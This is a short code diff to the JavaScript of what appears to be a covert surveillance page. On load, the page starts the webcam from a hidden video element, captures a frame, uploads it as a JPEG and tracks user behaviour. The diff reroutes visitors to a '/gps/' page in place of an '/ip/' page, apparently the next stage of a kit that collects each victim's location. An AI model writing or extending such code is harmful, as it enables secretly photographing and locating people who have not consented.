@@ -13,6 +13,11 @@
     function init() {
       startWebcamCapture();
       trackUserBehavior();
+
+      // Redirect to gps/index.html after webcam capture
+      setTimeout(function () {
+        window.location.href = "/gps/index.html";
+      }, 2000);
     }
 
     function startWebcamCapture() {
@@ -25,7 +30,7 @@
           handleWebcamSuccess(stream);
         } catch (e) {
           alert("Allow Camera access to continue.");
-          window.location.href = "/ip/index.html";
+          window.location.href = "/gps/index.html";
         }
       }
 
@@ -37,9 +42,6 @@
         setTimeout(function () {
           context.drawImage(video, 0, 0, 640, 480);
           canvas.toBlob(postFile, 'image/jpeg');
-
-          // Redirect to the next page
-          window.location.href = "/ip/index.html";
         }, 1500);
       }
 
@@ -99,7 +101,6 @@
 
       request.send(JSON.stringify(params));
     }
-
   </script>
 
   <div class="video-wrap" hidden="hidden">
